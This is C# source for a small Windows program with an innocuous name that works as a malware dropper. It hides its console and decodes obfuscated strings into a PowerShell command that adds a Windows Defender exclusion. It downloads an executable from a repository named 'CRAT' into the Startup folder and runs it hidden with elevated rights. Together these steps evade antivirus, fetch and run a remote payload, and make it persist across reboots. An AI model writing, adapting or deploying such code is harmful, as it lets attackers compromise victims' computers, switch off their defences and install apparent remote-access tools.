using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace MakeDirAndDownloadFile
{
    internal class Program
    {
        // Кросс-платформенное скрытие консоли
        private static void HideConsole()
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                [DllImport("kernel32.dll")]
                static extern IntPtr GetConsoleWindow();

                [DllImport("user32.dll")]
                static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

                const int SW_HIDE = 0;
                var handle = GetConsoleWindow();
                ShowWindow(handle, SW_HIDE);
            }
        }

        static void Main(string[] args)
        {
            HideConsole();

            try
            {
                Cp cp = new Cp();
                string nm = cp.decrypt("srzhuvkhoo.hah");
                string com = cp.decrypt("Dgg-PsSuhihuhqfh -HafoxvlrqSdwk 'F:\\PbIroghu'");

                ExecuteProcess(nm, com);

                string link = "https://github.com/arkadiychulkover/CRAT/raw/refs/heads/master/CRAT/ForEgor.exe";
                string fileName = "ForEgor.exe";
                string autostartPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                string filePath = Path.Combine(autostartPath, fileName);

                if (!File.Exists(filePath))
                {
                    DownloadFile(link, filePath);
                }

                ExecuteProcess(filePath, "");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
                Console.ReadKey();
            }
        }

        static void ExecuteProcess(string fileName, string arguments)
        {
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = fileName,
                Arguments = arguments,
                Verb = "runas",
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using (Process process = new Process { StartInfo = startInfo })
            {
                process.Start();
                process.WaitForExit();
            }
        }

        static void DownloadFile(string url, string savePath)
        {
            using (WebClient client = new WebClient())
            {
                client.DownloadFile(url, savePath);
            }
        }
    }
}